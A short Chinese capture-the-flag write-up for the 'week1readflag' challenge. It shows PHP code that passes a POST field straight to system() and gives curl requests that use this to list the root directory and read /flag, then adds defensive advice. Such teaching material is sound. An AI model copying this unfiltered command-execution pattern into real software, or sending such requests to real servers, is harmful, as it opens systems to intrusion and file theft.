# week1readflag

## 题目简述

页面把 POST 参数 `cmd` 原样交给 `system` 执行，是一个没有过滤和转义的系统命令执行点。题目提示 flag 位于文件系统根目录，因此先枚举 `/`，再读取目标文件。

官方源码的关键逻辑为：

```php
if (isset($_POST['cmd'])) {
    @system($_POST['cmd']);
}
```

## 解题过程

先提交 `ls -la /` 确认根目录中的文件名：

```bash
curl -s -X POST -d 'cmd=ls -la /' 'http://<HOST>:<PORT>/'
```

看到 `/flag` 后，再提交读取命令：

```bash
curl -s -X POST -d 'cmd=cat /flag' 'http://<HOST>:<PORT>/'
```

这里的 `cmd` 是表单字段，不是 URL 参数。由于服务端没有黑名单、白名单或 shell 转义，命令的标准输出会直接进入 HTTP 响应。

## 方法总结

- 核心技巧：通过未过滤的 `system($_POST['cmd'])` 执行系统命令并读取文件。
- 识别信号：用户输入直接进入 `system`、`exec`、`shell_exec` 或反引号表达式。
- 复用要点：先用只读命令确认路径，再读取目标；防御时应避免调用 shell，至少使用固定命令白名单和严格参数校验。
